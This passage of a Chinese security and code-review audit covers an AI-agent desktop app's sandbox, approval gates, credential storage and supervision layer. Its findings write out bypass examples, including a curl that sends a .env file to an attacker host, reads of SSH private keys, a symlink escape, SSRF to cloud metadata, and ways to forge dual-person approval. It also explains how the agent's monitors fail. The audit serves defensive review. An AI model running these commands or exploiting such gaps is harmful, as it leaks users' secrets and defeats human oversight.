| REV-034 | 前端 | 中 | 安全 | `LoopDebugger.tsx:241 JSON.stringify(evt.payload)` 明文直渲，而迭代/工具事件 payload 含工具入参与原始输出全文（`ipcBridge.ts:1104-1109`），文件中的密钥原样展示，`/api/loops/events` 无脱敏 | △子代理 |
| REV-035 | 前端 | 低 | 交互 | LoopDebugger trace 选择自毁：`loopStore.ts:34 set({events: res.data})` 整体替换 → 选中 trace 后列表只剩一条且无法切回全量；`:64` 无选中时 `evts.sort()` 原地突变 store 数组；未知 trace 恒显"加载中" | △子代理 |
| REV-036 | 前端 | 低 | 契约 | 事件名 SSOT 失同步：镜像 `shared/eventTypes.ts` 缺 `agent:todo_updated`（`todoStore.ts:69` 硬编码字符串违反"零自造字符串"）；`strategy:switch` 后端从未注册；registry 声明的 `agent:tool_call`/`agent:reasoning_*` 非真实事件名；`agent:chat_message` 前端无消费；`LOOP_*`/`no_progress`/`fingerprint_duplicate`/`verifier_failed`/`approval_timeout_rejected`/`durable:*` 共 11 个枚举是**零发布方的死契约** | △子代理 |
| REV-037 | 架构 | 中 | 业务（孤岛清单，待裁定） | 实现但生产零调用的循环侧孤岛：`pauseLoop`/`resumeLoop`（**系统实际无暂停/恢复能力**，UI 也只有"停止"）、`getLoopSummary`/`getIterationStats`（`loopApi.ts` 无 loop 状态端点）、`createStopRuleEvaluatorMiddleware`/`createCheckpointWriterMiddleware`（hook `afterAgent` 无派发点）、`create{GoalReanchor,FingerprintDetector,BudgetSentinel}ControlMiddleware`、builtin `FingerprintDetector`（`history` 取出未写回、`lastOutputFingerprint` 无人读）与 builtin `GoalReanchor`（`needsGoalReanchor` 无人置位）⇒ **指纹四规则与目标重锚实际零作用**（这是既存"空结果空转"BUG-2026-10-08-1 的第二条独立根因）；另有 `failureFeedback.*`、`strategyLedger` 全部写读、`detectBudgetPhase`、`checkTimeoutApprovals`/`getApprovalsByLoop`、`LoopScheduler.scheduleLoop/checkBreaker/checkDedup`、`executeRecovery/resume/validateRecoveryPlan` | △子代理 |

### M02 已核对干净
1. 系统提示三区分离、缓存键含角色/资产段、追加区排在历史尾（`runIteration.ts:102-124,509-516`）。
2. checkpoint 只存元信息（iteration/toolNames/pendingEffects），未把工具结果原文入库（`iterationCheckpoint.ts:58-70`）——无脱敏缺陷。
3. EffectJournal INTENT 写失败 fail-closed 拒执行（`toolSafetyGate.ts:408-418`）。
4. 审批超时默认拒绝、系统角色不得自动通过、不同角色须不同身份（`approvalGate.ts:214-219,265-299`）——**注意其结论与 REV-040 不矛盾：判定逻辑正确，但前端提交方式使其永不满足**。
5. 每轮即时事件 + `assertStepOrder` 留痕、`pendingNotified` 按 index 去重；FE-012 尾随节流、审批 PENDING 中间态守卫、pending→started 工具块就地接管去重。

---

## 5. M03 工具系统与执行安全（REV-038~059）

| ID | 层 | 严重度 | 类别 | 一句话现象 | 证据 |
|---|---|---|---|---|---|
| REV-038 | 服务+桌面 | 严重 | 安全 | 未绑定工作目录时路径守卫**退化为整个项目根可读写**：`pathGuard` 未初始化直接 `allowed:true`；`agentExecutor` 的 executeLoop 上下文只给 sessionId 无 workDir；各工具仅在有 `context.workDir` 时才收敛 → 子 Agent 可读 `<appRoot>/.env`、可写 `Configs/security.json` | ✅复核（`pathGuard.ts:100`、`fileReader.ts:52`、`agentExecutor.ts:85-93`、`main.ts:234` allowedRoots） |
| REV-039 | 服务 | 严重 | 安全 | `forbiddenPaths` 静态失效：配置写 `~/.ssh/` 但 `resolve(projectRoot,'~/.ssh/')` 得到字面量 `<root>\~\.ssh`（`~` 未展开）；前缀比对区分大小写而 NTFS 不区分 → 唯一"硬禁清单"形同虚设 | △子代理（`main.ts:229`、`pathGuard.ts:80,124-125`） |
| REV-040 | 三端 | 严重 | 交互/业务 | 一键"补齐角色"永远无法通过 CRITICAL：前端把**同一个** `decidedBy` 套到所有角色（`approvalStore.ts:114-119`），后端 human_proxy 把各角色身份收敛到同一账号 → `countDistinctRoleMatches` 恒 1 < 2；而 `decide()` 循环后**无条件 `return true`**，UI 谎报成功，`getApprovalProgress` 显示"2/2 已审批"，后端却恒 PENDING 直到 60s 超时拒绝 ⇒ **高危工具在单客户端下 100% 走不到执行**，用户误读为"被拒" | ✅复核（`approvalStore.ts:109-138`、`approvalGate.ts:239-246`） |
| REV-041 | 服务 | 高 | 安全 | `shell.exec` 越界检查可绕过：按空白切 token 且只认绝对路径字面量与 `..` → `type %USERPROFILE%\.ssh\id_rsa` 放行；`cmd /c` 的 `/c` 被当开关跳过；黑名单仅 `command.includes` → `rm  -rf  C:\`（双空格）、`powershell Remove-Item -Recurse -Force` 绕过；`isNetworkAllowed` **零调用点** → `curl -d @.env http://attacker` 无阻断 | △子代理（`workspaceGuard.ts:163,173`、`whitelist.ts:122`） |
| REV-042 | 服务 | 高 | 安全 | `dir.list` / `file.grep` 递归跟随符号链接逃逸工作区：守卫只作用于入参根路径，递归用 `statSync` 判目录后无条件深入 → 先 `mklink` 再 `file.grep path="."` 即可把私钥内容读进结果 | △子代理（`grepTool.ts:105-107,63`、`dirLister.ts:82-88`） |
| REV-043 | 服务 | 高 | 交互/安全 | 工具结果缓存键不含 workDir/session/agent：键 = `owner:tool:hash(args)`，SAFE+YES 命中即跳过执行且**守卫不重跑** → 会话 A 的 `dir.list "."` 结果 5 分钟内被会话 B（不同 workDir）读到；`todo.write` 相同内容提交给另一 agentId 直接命中缓存 → `replaceTodos` 从不执行（"计划写了但没出现"） | △子代理（`toolDispatcher.ts:73-96`、`toolResultCache.ts:59`） |
| REV-044 | 桌面 | 高 | 安全 | `open-path` → `shell.openPath` 任意本地路径：Windows 上对 exe/bat/lnk/msi 是**执行**而非打开；配合 `file.write` 构成"agent 写载荷 + renderer 开"RCE 链（**REV-002 的前半，此处升格为独立高危条目**） | △子代理（`main.ts:420-426`） |
| REV-045 | 桌面 | 高 | 安全 | `server-fetch` 任意 URL + 任意 header 由主进程 Node 发起（无 CORS、无 host allowlist、无 timeout，前端 AbortSignal 无法真正取消）→ SSRF/云元数据 `169.254.169.254`/内网扫描/携带渲染层可见的 api_key 外带（**REV-002 的后半**） | △子代理（`main.ts:384-391`、`api.ts:87-96`） |
| REV-046 | 服务+桌面 | 高 | 业务/体验 | `shell.exec` 用 `execSync`：后端与 Electron 主进程同进程 ⇒ 一条长命令冻结整个应用（窗口无响应、`ipc-*` 排队、流式停摆、`window-all-closed` 都不触发）；`timeoutMs` 取自模型入参无上限；`toolRegistry.ts:110-120` 的 `Promise.race` 无法抢占同步调用（**注册表超时形同虚设**）；非零退出仍返回 `toolSuccess`（削弱 325242e 的"连续失败"修复）；`maxBuffer` 溢出被误报成 `COMMAND_TIMEOUT`；强杀时 cmd.exe 成孤儿 | △子代理（`shellRunner.ts:49,113,130,133`） |
| REV-047 | 三端 | 中 | 安全 | 审批 payload 与工具参数零脱敏：`ApprovalCard.tsx:51-54` 与 `ToolGroup.tsx:152-154` `JSON.stringify` 原样渲染并进 tooltip；后端入队即带 `{toolName, arguments}` 未脱敏 → 密钥/绝对路径/内网 URL/文件正文出现在屏幕、SQLite `pending_approvals` 与事件广播中 | △子代理（`toolSafetyGate.ts:287`） |
| REV-048 | 服务 | 中 | 安全/交互 | 入参 schema 从不校验（`specValidator.validateInput` 生产零调用）；`tool.execute(name="file.write")` 借壳使 per-tool 法典与 INTENT 失效（内层派发不再经 `wrapToolCall`）；`fileWriter.ts:28` 声明 `encoding` 但从不读取（静默 utf-8）；非法入参只得到 `TOOL_EXECUTION_ERROR` 级 TypeError 文本 | △子代理（`toolSafetyGate.ts:209`、`toolExecutor.ts:72`） |
| REV-049 | 服务 | 中 | 业务 | 写/编辑**无任何备份**：`fileWriter.ts:76`/`fileEditor.ts:104` 直落 `atomicWrite`（rename 覆盖原文件），而 `getSessionBackupDir` 全仓零消费者；spec 却声明 `reversibility:'PARTIAL'`。复现：`file.edit path=x useRegex=true search=".*" replace=""` → 整文件清空且不可恢复 | △子代理 |
| REV-050 | 三端 | 中 | 安全 | 工作目录本身不受根约束：`ensureWorkspaceDir` 只做 `resolve()`+`mkdirSync` 无 `isWithinWorkspace`；dir picker/浏览器 `window.prompt` 接受任意绝对路径与 UNC → `sessions.create({workDir:'C:\\'})` 后 shell 的越界检查以 workDir 为根，**根=磁盘根即全盘可达**（等价于无沙箱） | △子代理（`workspaceGuard.ts:60-64`、`directoryPicker.ts:24-28`） |
| REV-051 | 桌面 | 中 | 安全 | `setWindowOpenHandler` 直调 `shell.openExternal(url)` 未过 `open-external` 的 http(s) 白名单（`main.ts:241-243` vs `:438`）→ `window.open('file:///...x.exe')` 与 044 同类执行面，两处规则漂移 | △子代理 |
| REV-052 | 前端 | 中 | 日志/体验 | 审批 hydrate 失败完全静默（`approvalStore.ts:89-90` 不写 lastError）；轮询间隔硬编码 30s（`useApprovalPolling.ts:21`）而 `configSchema.ts:254 ui.approvalQueueRefreshSec` 全仓无读取点 → 浏览器态（无事件下行）审批最长 30s 才可见，60s 窗口一半流失直接超时 | △子代理 |
| REV-053 | 前端 | 中 | 交互 | 决策竞态：全局单槽 `decidingId`（`approvalStore.ts:94,140` finally 会清掉他人请求的锁）+ 内嵌卡本地 `submitting`（`ToolGroup.tsx:259,285`）可并发提交同一审批；第二次 409 的错误原文只在审批栏渲染，内嵌卡显示泛化"提交失败" | △子代理 |
| REV-054 | 前端 | 中 | 业务 | 法定人数与超时语义前端自判：`approvalStore.ts:48 requiredCount = a.deciders.length` vs 后端 `requiredApprovals ?? (len>=3?2:len)`；UI 硬编码"超时默认拒绝"而 `supervision.approvalDefaultOnTimeout` 可配 `abort_loop` → 三端语义不同源 | △子代理 |
| REV-055 | 前端 | 中 | 体验 | 审批缺可用性设计：无拒绝原因录入（store 有 `reason` 但调用点恒 undefined）、无批量审批、写类工具无 diff 视图（全仓无 diff 组件），`ToolGroup.tsx:216-222` 把大结果整段塞进单个 `pre`；长期无人处理无提醒/升级 | △子代理 |
| REV-056 | 桌面 | 中 | 安全 | `ipc-load-secrets` 把**全部供应商明文 apiKey** 整包回传渲染层（`ipcBridge.ts:827-831`，`modelStore.ts:139` 消费后驻留 store）；全仓 `Src/Interface`+`electron` 内 `senderFrame`/`event.sender` 校验**零命中** | △子代理 |
| REV-057 | 三端 | 低-中 | 安全/体验 | `autoApproveTools` 白名单（`toolSafetyGate.ts:335-341` → `forceApprove`）来源 `main.ts:249`，`configSchema.ts` 无对应字段 → 设置页看不见也关不掉；决策广播不带 `auto` 而 `useEventBus.ts:166` 读 `data.auto` → "已自动通过（策略白名单）"提示退化 | △子代理 |
| REV-058 | 桌面 | 中 | 交互 | preload 层级错配致整条功能失效：`preload.ts:74-79` 把 `a2aSync` 嵌在 `modelProviders` 内，而 `ipcApi.ts:331` 读 `electronAPI.a2aSync`（类型声明 `preload.ts:180` 也是顶层）→ A2A 同步恒返回"Electron API 不可用" | △子代理（归 M07 复核） |
| REV-059 | 架构 | 中 | 业务（待裁定） | 隔离层为空转：`Src/Infra/Terminal/` 仅 `.gitkeep`（文档所称终端层未实现）；`Infra/Sandbox/validateIsolation` 是字符串前缀比较且零调用点，`workspaceIsolator` 五级隔离整体未接线；`sandboxMode:'strict'` 声明无 OS 级实现证据；`toolHeader.ts:102-106` 日志的 `original/truncated` 均取截断后的值（观测失真） | △子代理 |

### M03 路径/命令守卫覆盖矩阵（修复时的验收清单）
| 工具 | workspaceGuard | pathGuard（IO 前） | 命令/网络门控 |
|---|---|---|---|
| file.read | ✅（仅在有 workDir 时收敛，见 REV-038） | ✅ `fsSafe.ts:55` | — |
| file.write | ✅ | ✅ 经 `atomicWrite.ts:55`（工具内 `:86` 为事后无用调用） | — |
| file.edit | ✅ | ✅ 经 atomicWrite | — |
| dir.list / file.grep | ✅ 仅入参根 | ✅ 仅入参根 | 递归无校验（REV-042） |
| shell.exec | cwd ✅；命令仅 token 扫描（REV-041） | ❌ 完全不查 | 黑名单 substring |
| code.eval | ❌ 无任何路径/网络约束 | ❌ | ❌（仅审批，且审批门见 REV-023/040） |
| web.search | — | — | ❌ `isNetworkAllowed` 未接线 |
| todo.write / tool.search / tool.execute | — | — | 见 REV-043/048 |

### M03 已核对干净
1. `realPathOf` 对"不存在目标的最深已存在祖先"做 realpath（`workspaceGuard.ts:78`）；write 前 INTENT 失败 fail-closed；FORBIDDEN 注册期+运行期双拒。
2. `fsSafe.ts:150` atomicAppend 读失败不抹原文件；`quotaManager` 扫描到不可访问条目会告警。
3. preload 无通用 invoke 转发，未暴露 `ipcRenderer`/fs/child_process 本体（全具名白名单）；`nodeIntegration:false` + `contextIsolation:true`（`main.ts:227-228`），`will-navigate` 一律 preventDefault。
4. 审批倒计时取后端 `requestedAt + timeoutSec` 真实差值；超时 fail-closed 落 TIMEOUT，无"默认通过"路径；`isSystemActor && approve` 被拒。
5. `toolMessageIndex` 预登记避免审批事件早于 flush 而丢关联；落库前把 `generating/pending` 收敛为 `NOT_EXECUTED`（重启后工具行不会永远转圈）；工作目录锁判据单一化、IPC/REST 共用未被绕过；`stopIpcBridge` 会 `abortAllActiveStreams`；`getConfig` key 正则过滤无路径分隔符注入；memory 查询按 owner 隔离且 limit clamp。

### M03 通道核对补充（归 M08 处理）
死通道：`get_approvals` / `get_dashboard` / `subscribe` / `ping` / `ipc-get-todos` / `ipc-clear-todos` 前端无调用方（审批读写全走 HTTP，反而占用限流预算）；IPC 侧无工具执行通道；`stopIpcBridge` 漏移除 a2a 通道（`ipcBridge.ts:299-331`）。

---

## 6. M04 模型接入与凭据（REV-060~075）

| ID | 层 | 严重度 | 类别 | 一句话现象 | 证据 |
|---|---|---|---|---|---|
| REV-060 | 服务 | 严重 | 交互/日志 | **流式错误帧被同一行的空 catch 吞掉**：`classifyHttpError` 的 `throw` 位于逐行 try 内，被 `catch { /* 跳过解析失败的行 */ }` 吞 → 流内 401/限流/内容拦截被判"成功且空回复"；注释里的"跳过"刚好通过了 `noSilentErrorSwallow` 门禁（**门禁被合规注释绕过**） | ✅复核（`openaiProvider.ts:228-233` throw + `:296-298` catch） |
| REV-061 | 服务 | 严重 | 交互/业务 | 请求体丢弃 `tool_call_id`/`name`/assistant 的 `tool_calls`：`messages.map(m => ({role, content}))`，而 `runIteration.ts:990-995` 追加的 `role:'tool'` 消息也不带 `tool_call_id` → OpenAI 兼容端对含 tool 轮次的请求极可能 400；`providerBase.ts:40-45` 明明声明了这些字段 | ✅复核（`openaiProvider.ts:90`/`:156`） |
| REV-062 | 三端 | 高 | 交互 | 改 API 地址＝新增实例：`sameTarget` 要求注册名与 `base_url` **全等**（未走 `normalizeBaseUrl`）→ 产出 `huawei-maas-2`，而 `routing.defaultModel` 仍按旧全限定名解析命中旧 provider ⇒ 用户填的新地址与新 Key 静默不生效，表现为"未配置 API Key（环境变量未设置）"；重启后 `providerSecretMatch` 名字/端点双锚点也失配，两实例并存 | △子代理（`ipcBridge.ts:429-432`、`modelRouter.ts:52`、`:966/984`） |
| REV-063 | 服务 | 高 | 安全 | `base_url` 服务端零校验（M04 是唯一带 Key 出站通道）：地址裸拼 `${base_url}/chat/completions`、`/models`；`isNetworkAllowed` 生产零调用（同 REV-041 根因）→ 填 `http://169.254.169.254/`、`http://127.0.0.1:6379` 或攻击者域，后端会以 `Authorization: Bearer <key>` 投递且 http 明文不受限；`ipcBridge.ts:502` 还把内网响应原文回传渲染层 | △子代理 |
| REV-064 | 服务 | 高 | 安全 | 凭据持久化三处完整性缺口：无 safeStorage 即 `__base64__:` 假加密（仅 warn，"生产必须 safeStorage"无门禁）；`writeFileSync` 非原子；解密失败 `catch → return null` → 上层 `if (!stored) return`（**换机/DPAPI 上下文变化即被当"无凭据"，且一次非 Electron 写入会用 Base64 覆盖 DPAPI 密文，不可恢复**）；`upsertProviderSecret` 不查 `isUsableSecret` ⇒ 744b075 的"空写覆盖"守卫只挂在旧整包通道上，`ipc-add-provider` 缺 `api_key` 仍会把同名好 Key 覆盖成空 | △子代理（`secretsStore.ts:121-129,153,167-171,191-195`） |
| REV-065 | 服务 | 高 | 安全/日志 | 凭据原文进日志与界面：`providerBase.ts:218` 把 `api_key_ref` 值直接插进异常消息 → `ipcBridge.ts:990-995` `logger.warn({reason})` 与 `:1001` 的 `STREAM_END.error` 直达渲染层并入库；`logger.ts:230-236` **无任何字段脱敏**；`keyStore.ts:123 getMaskedKey` 零调用点。复现：`modelRouter.json` 写 `"api_key_ref":"sk-明文"`（漏 `env:`）→ 每次发消息日志与界面出现完整 Key | △子代理 |
| REV-066 | 服务 | 中 | 体验/日志 | 流式路径零超时/零重试/零降级：`modelCaller.ts:135-157` 不建 AbortController、不调 `callWithRetry`/`getFallbackProviders`；`firstByteTimeoutMs`/`interChunkTimeoutMs` 被装进 RoutingConfig 后**全仓无消费方**（`streamParser.ts` 只被测试用）→ 上游半开连接该轮永不结束（与 REV-025 不同行根因）；`callWithRetry` 重试零留痕且 `delay()` 被 abort 时抛出而非返回 Result | △子代理 |
| REV-067 | 服务 | 中 | 交互/配置 | 用户可编辑配置校验缺口：`configValidator.ts:188-198` 只校 `default`/`loopConfig` 两段（providers/base_url/timeoutMs 零校验）；`onboardingIpc.ts:92-100 applyRoutingPatch` 不看 `writeUserConfig` 的 `invalid` 结果仍 `setRoutingConfig`。复现：`ipc-write-user-config {routing.timeoutMs:"60s"}` 返回 `ok:true`，内存里 timeoutMs 变字符串 → `setTimeout('60s')` 立即 abort，用户见"请求已取消" | △子代理 |
| REV-068 | 三端 | 高 | 交互 | 设置面板改路由**只改内存不落盘**（`ipcBridge.ts:540` 只 `setRoutingConfig`）→ 当场生效、重启回退；而引导页走 `local.json` 落盘 ⇒ 同一"保存"两种语义 | △子代理 |
| REV-069 | 三端 | 高 | 体验 | 浏览器态模型/凭据 CRUD 完全不可用却仍被引导过去：`ipcApi.ts:83/97/119` 恒返回 `'Electron API 不可用'`，`configApi.ts` 只有 GET 无 provider/secrets REST，而缺 Key 弹窗 CTA"前往设置密钥"直达该失效面板 ⇒ 死循环 | △子代理（同 REV-003 家族的通道缺口） |
| REV-070 | 前端 | 中 | 交互 | 显式选预设会静默覆盖用户已填地址（`ModelProviderPanel.tsx:67-69`）；且提交时 `provider` 用 preset 名、`base_url` 用用户改后的值（`:170-176`）→ "选了 OpenAI 却填 DeepSeek 地址"，注册名仍是 openai（与 REV-062  compounded） | △子代理 |
| REV-071 | 前端 | 中 | 安全 | Onboarding 明文 Key 常驻 Zustand `draft.apiKey` 且注册成功/完成/跳过均不清洗（`onboardingStore.ts:179,369-425,442-497`，`selectPreset:307` 还显式保留），与面板侧"成功即清"形成分叉 | △子代理 |
| REV-072 | 前端 | 中 | 体验 | 删除供应商无二次确认、无"编辑/换 Key"通道（`ModelProviderPanel.tsx:191-193,423-430`，后端 `removeProviderSecret` 同步不可逆）→ 换 Key 只能删后重填 | △子代理 |
| REV-073 | 三端 | 中 | 业务 | 模型规格由 `/models` 硬编码伪造并展示+落盘：`ipcBridge.ts:505-513` `context_window:128000 / supports_tools:true`，`onboardingStore.ts:378-379` 再兜底；`ModelSpec.supports_vision/supports_tools/max_output` **零消费** → 前端能力标签与真实模型无关，token 上限口径失真 | △子代理（与 M04-S 疑点同条） |
| REV-074 | 前端 | 低-中 | 体验 | 面板"测试"只 GET `/models` 无对话探测 → 能列模型但对话 401 的 Key 显示"测试成功"（引导页 `ipcTestProvider` 反而有 chat 探测，两形态能力分叉） | △子代理 |
| REV-075 | 前端 | 低 | 安全/体验 | 原始 HTTP body 透传进红色错误条（`ipcBridge.ts:502` → `ModelProviderPanel.tsx:87` 原样渲染，body 可含账号信息）；"确认添加"按钮 `disabled` 不含 `loading`（`:385-387`）可重复提交 | △子代理 |

### 凭据流转图（修复验收用）
| 环节 | 位置 | 加密/脱敏 |
|---|---|---|
| 输入 | `ModelProviderPanel.tsx:280`、引导 `:332`（`type=password`） | 前端掩码 ✅ |
| 规范化 | `providerProbe.normalizeApiKey`（清理零宽/引号/Bearer） | ✅ |
| 注册 | `ipcBridge.ts:437` `api_key_ref = inline:<明文Key>` 存进程内存 | ⚠️ 明文常驻；同名双实例（REV-062） |
| 出站 | `resolveApiKey()` → `Authorization: Bearer` | ⚠️ base_url 无校验（REV-063） |
| 落盘 | `secretsStore` → safeStorage(DPAPI) ✅ / **Base64 假加密** ❌；非原子、无 0600 ❌；`.gitignore` 已排除 `Data/.secrets/` ✅ | REV-064 |
| 恢复 | `ipcBridge.ts:361 restoreProvidersFromSecrets`（脏数据只计数 `skipped`；解密失败＝无凭据） | ❌ |
| 日志 | `logger.ts:230-236` 无字段过滤；`getMaskedKey` 零调用 | ❌（REV-065） |
| 下行 | `ipc-load-secrets` 整包明文（已登记 REV-056；前端 `restoreFromSecrets` 目前是死代码无调用方，未扩散） | ❌ |

### M04 已核对干净
1. `electron/main.ts:60-62 → setElectronRuntime → setSafeStorageProvider` 接线正确（修掉打包态 ESM 拿不到 safeStorage 的退化）。
2. `providerBase.ts:227-230` 剥 provider 前缀，不把 `huawei-maas/GLM-5.1` 发给上游；`classifyHttpError` 与 `retryPolicy` 矩阵分类一致。
3. `providerProbe`：`listNotProvided` 与鉴权失败分离、非对话模型排除、`verifyModels` 把 429/5xx/鉴权判 `unknown` 不误杀。
4. `main.ts:459-479` 供应商配置写错不再静默（点名 provider/base_url/原因），`providerCount===0` 直接抛错；`keyStore` 的 `env:` 引用有启动预检告警。
5. 前端零 Key 落盘（`configStore` 只存 routing/logLevel 白名单）；Key 不回显、不拼 query、无复制/导出通道；`addProvider` 已删整包写回。

### M04 疑点（不立条，修复前需实连验证）
- 计费口径：请求体无 `stream_options.include_usage`（`OpenAIRequest` 无此字段），流式 `usage` 恒 0 → `runIteration.ts:620/665` 的 `tokensConsumed`/钱包/预算在主流路径可能整体失真。需实连各家验证是否默认回 usage。
- `categorizeError` 靠中文文案与子串 "401/429/503" 反推分类 → 上游 body 出现这些数字即误判重试/降级。
- devtools 可见 IPC 明文 Key payload 的暴露面未评估；`providerMessage` tooltip 可能含账号邮箱。

---

## 7. M05 治理域（第一部分：Governance / Regulation / Supervision / Audit，REV-076~084）

| ID | 层 | 严重度 | 类别 | 一句话现象 | 证据 |
|---|---|---|---|---|---|
| REV-076 | 服务 | 严重 | 安全 | **立法/执法端点的唯一门是"请求体自报角色名"**：`regulationApi.ts:82`、`auditApi.ts:43/54/65` 从 body 取 `actorRole`，`governanceGuard.ts:136` 只做 `isGovernanceRole(actorRole)` 字符串比对即记 `allowed`。审批域有 `bindApprovalIdentity`，立法/执法域**完全没有对应绑定**（与 REV-001 不同根因：即使加了鉴权，角色仍来自请求体） | ✅复核 |
| REV-077 | 服务 | 严重 | 安全 | **CRITICAL 双人控制可被单人凑齐**：Agent 裁决身份只需 `agent-<role>-<n>` 且注册表角色匹配（`approvalIdentity.ts:129-157`，无持有证明），而 `agentId` 是进程内自增可枚举（`agentFactory.ts:44`），`GET /api/agents` 无鉴权可枚举（`agentApi.ts:33`），更糟的是审批门自己会 `ensureAgentsForRoles(...)` 把 auditor/regulatory_authority 的 L0 Agent 播种出来（`toolSafetyGate.ts:263`）→ 两次 POST 即独立放行不可逆操作。**与 REV-040 是同一机制的两个反向失效面** | ✅复核 |
| REV-078 | 服务 | 高 | 交互 | 监督/审计信号"发布即终结"：`anomalyDetector:199`、`patrolScheduler:143`、`freezeManager:71`、`resourceAuditBureau:153`、`behaviorCode:209`、`regulatoryAuthority:134` 六个事件**全库零订阅者**；唯一把 critical 告警转成冻结执法的 `resourceAuditBureau:88-91` 挂在 `monitorAgent` 上，而 `monitorAgent` **0 生产调用**；`auditScheduler:77 checkRollingWindow()` 返回值丢弃 ⇒ 检测→执法断链 | △子代理 |
| REV-079 | 服务 | 高 | 业务/安全 | 紧急干预"已执行"是假象：`regulatoryAuthority.ts:145-147` 仅因事件发布 ok 就置 `record.executed = true`，`force_terminate`/`pause_all` **无任何执行体**（与 REV-037 的 `pauseLoop` 孤岛互证） | △子代理 |
| REV-080 | 服务 | 高 | 业务 | 三条 enforceable 规则在真实调用面永不命中：唯一 enforcement 点传的是 `action: input.toolName`（`toolSafetyGate.ts:209-213`），而 `behaviorCode.ts:152-154` 关键词分支要求工具名含 `access_private`/`prompt_injection`/`consecutive_failure`，`DEFAULT_RULES` 的 condition 用 `agent.access(...)` DSL 与 `tool.forbid()` 语法不匹配；`rule.action`/`severity` 在 `checkViolation` 中被完全忽略 ⇒ safety-001/002 等全是装饰，"重大异常须上报监管局"无实现；一旦有人补 `tool.forbid(x)`，warn 级也会被硬拒 | △子代理 |
| REV-081 | 服务 | 高 | 安全/日志 | 防风暴半成品 + 监管拒绝零留痕：两个生产入口硬编码 `recentCallTimestamps: []`（`agentExecutor.ts:92`、`ipcBridge.ts:1044`）→ `preSupervision.ts:85 rateLimited` 恒 false，`supervision.rateLimit`(30/min) 形同虚设；`runIteration.ts:417-429` 监管拒绝后只返回 exitMessage，不 `recordGovernanceAction` 也不发事件 ⇒ 注入命中/冻结命中不进台账，用户只看到 loop 退出、不知被谁按哪条规则拦下 | △子代理 |
| REV-082 | 服务 | 高 | 日志/可追溯 | 治理核心动作在台账里缺席：`approvalApi.ts:85-103` 裁决成功只 publish 无 `recordGovernanceAction`；台账仅在三处写 `approval.decide` **且全是失败路径**（`approvalIdentity.ts:135,146`）；`governanceGuard.ts:148` 的 `'裁决审批'` 标签无调用方（死码）；超时 `approvalGate.ts:157-164` 仅置 TIMEOUT，`checkTimeoutApprovals`(:351) 零调用；`forceApprove` 只写 `autoApproved` 标记。另 `governance_records` 无 prev_hash 链、`:111` 用 `INSERT OR REPLACE`、内存台账满 2000 条即丢最旧 ⇒ **非只读追加、可被篡改** | △子代理 |
| REV-083 | 服务 | 中 | 业务/配置 | 阈值口径双源与死配置：全库 0 读取 `supervision.json` 的 `approvalTimeoutSec`/`criticalApprovalRoles`/`approvalDefaultOnTimeout`/`qualityThreshold`/`stormBreaker*`/`maxConcurrentLoops*`/`broadcastAckTimeoutSec`/`agentConsecutiveFailuresToExpel`/`triggerCooldown·DedupWindow`；实际生效值来自 `main.ts:252`（security 的 300 覆盖 supervision 的 60）⇒ 运维以为收紧了双人控制，实际调监督阈值无效果 | △子代理 |
| REV-084 | 架构 | 中 | 业务（孤岛清单，待裁定） | 治理侧实现但零生产调用：Supervision 五个 hook（`runLoopSupervision`/`detectDeadlock`/`runCompressSupervision`/`runSummarySupervision`/`runReasoningSupervision`）、`anomalyDetector.checkDeviation/checkLoop/monitorAgent`、`patrolScheduler.startAutoPatrol`、`approvalGate.checkTimeoutApprovals`、`broadcastChannel.acknowledge/getUnacknowledged`、`regulatoryAuthority.validateBehavior`、`governanceGuard.OWNER/EXECUTION_ROLES` 常量；另 `behaviorCode` 每次启动覆盖回 `DEFAULT_RULES`（**运行期立法不落库，重启丢规则**，`main.ts:809`）；`issueFinalVerdict` 不回写案件状态、`tribunal.ts:200 deadlocked` 无自动升级；`main.ts:815 resetFreezeManager()` + 纯内存 `freezeManager` ⇒ **冻结执法跨重启失效且无留痕**，`checkAutoUnfreeze` 只在 `startAuditCycle(86400_000)` 里跑 ⇒ 3600s 冻结最长滞留 24h；巡检口径失真（`auditScheduler.ts:50-52` 失败率可 >1、`patrolScheduler.ts:96` Top10% 恒 ≥1、`windowHours` 在 `executePatrol` 未使用） | △子代理 |

### 治理闭环接线核对表
| 环节 | 实现 | 生产调用点 | 闭合 |
|---|---|---|---|
| 规则加载 | `initBehaviorCode` | `main.ts:809` | ⚠️ 每次启动覆盖回 DEFAULT_RULES，运行期立法不落库 |
| 规则检测 | `checkViolation` | `toolSafetyGate.ts:209` | ⚠️ 已接但默认规则永不命中（REV-080） |
| 监督检测 | `runPre/PostSupervision` | `runIteration.ts:411/775` | ⚠️ 限流分支死（REV-081） |
| 审批门 | `createApproval/waitForApproval` | `toolSafetyGate.ts:280/359` | ✅（但单例摘除见 REV-023） |
| 裁决 | `bindApprovalIdentity→decideApproval` | `approvalApi.ts:82/85` | ❌ 强度崩塌（REV-076/077） |
| 执行 | 工具 `next()` + EffectJournal | `toolSafetyGate.ts:424` | ✅ INTENT 失败 fail-closed |
| 审计 | `recordGovernanceAction` | 仅守卫/身份失败路径 | ❌ 放行·超时·规则命中不入账（REV-082） |
| 异常→执法 | `monitorAgent` | 无 | ❌ 断链（REV-078） |
| 终审 | `issueFinalVerdict` | 仅手动 REST | ❌ 不回写案件状态 |
| 周期 | `startAuditCycle/stop` | `main.ts:826/923` | ✅（异常仅 warn，无失败告警） |

### M05（第一部分）已核对干净
1. `serverIdentity` 令牌验真 **fail-closed**（`!res.ok`/异常均返回 err，调用方 403；缓存只存 SHA-256 前缀）。
2. `extractBearerToken` 所需 header 已由 `httpServer.ts:145` 透传修复（方案 B 不再是死代码——但见疑点：前端从不附 Authorization）。
3. EffectJournal INTENT 写失败拒绝执行；FORBIDDEN 运行期第二道闸（`toolSafetyGate.ts:195-204`）。
4. 超时/系统角色不得自动通过（`approvalGate.ts:216-219`）。
5. `postSupervision` 的 `archived:false` 如实标记（FE-070，未假装已入库）。

### M05（第一部分）疑点
- 桌面 `Client/src/services/api.ts` 从不附 `Authorization` ⇒ 服务端身份验真在 UI 主路径**永不生效**（属 M08 通道治理，待与 REV-001 一并裁定）。
- `/v1/me` 由外部 Server(Fastify) 提供，若与本地后端同机部署，验真是否可被本地进程自答未验证。
- `governance_records` 属主由 `getActiveOwner()` 决定 ⇒ "切换活动账号"端点是否等价身份伪造入口，待 M09 复核。

---

## 8. M05 治理域（第二/三部分：仲裁·评审·招募 + 治理大屏，REV-085~100）

> 自本节起用紧凑格式：每行含 现象 / 证据 / 影响 / 修复方向。

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
